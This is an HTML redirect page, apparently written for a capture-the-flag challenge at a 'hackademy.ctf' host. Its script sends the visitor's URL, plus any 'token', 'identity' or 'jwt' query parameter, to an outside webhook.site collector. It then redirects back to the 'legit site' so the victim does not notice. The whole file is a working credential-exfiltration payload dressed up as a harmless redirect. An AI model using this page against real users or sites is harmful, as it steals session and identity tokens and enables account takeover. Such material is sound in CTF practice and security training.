<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
<script>
  // Log everything
  fetch("https://webhook.site/YOUR_ID_HERE?" + document.location.href);

  // Optionally decode JWT from URL and extract info
  const params = new URLSearchParams(window.location.search);
  const token = params.get("token") || params.get("identity") || params.get("jwt");

  if (token) {
    fetch("https://webhook.site/YOUR_ID_HERE?token=" + encodeURIComponent(token));
  }

  // Redirect back to legit site
  window.location = "https://chal5.hackademy.ctf/";
</script>
<p>Redirecting...</p>
</body>
</html>
